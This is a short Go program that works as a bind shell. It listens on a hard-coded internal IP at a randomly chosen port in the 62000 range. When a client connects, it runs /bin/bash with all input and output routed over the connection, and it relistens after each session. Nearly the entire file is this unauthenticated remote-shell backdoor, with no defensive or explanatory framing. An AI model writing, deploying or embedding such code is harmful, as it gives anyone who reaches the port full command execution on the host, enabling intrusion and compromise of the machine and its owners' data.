package main

import (
	"fmt"
	"math/rand"
	"net"
	"os/exec"
	"strconv"
	"time"
)

var host string = "192.168.12.6"
var port string

func main() {
	do()
}

func do() {
	port = "62" + getPort(0, "")
	fmt.Println("Listening on port " + port)
	shell()
}

func getPort(i int, p string) string {
	i++
	if i > 3 {
		return p
	}
	p = p + strconv.Itoa(random(10))
	return getPort(i, p)
}

func random(n int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(n)
}

func shell() {
	list, err := net.Listen("tcp", host+":"+port)
	if err != nil {
		fmt.Println(err.Error())
		fmt.Println("first")
	}
	con, err := list.Accept()
	if err != nil {
		fmt.Println(err.Error())
		fmt.Println("second")
	}
	cmd := exec.Command("/bin/bash")
	//Set input/output to the established connection's in/out
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
	do()

}
